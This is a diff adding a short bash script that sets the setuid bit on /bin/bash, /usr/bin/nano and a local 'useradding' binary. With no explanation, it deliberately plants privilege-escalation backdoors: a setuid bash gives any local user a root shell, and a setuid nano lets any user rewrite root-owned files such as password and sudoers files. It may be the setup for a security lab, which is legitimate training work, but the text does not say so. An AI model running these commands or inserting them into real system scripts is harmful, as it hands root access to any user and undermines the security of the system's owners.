@@ -1,0 +1,6 @@
+#!/bin/bash
+
+chmod u+s ./useradding
+
+chmod u+s /bin/bash
+chmod u+s /usr/bin/nano
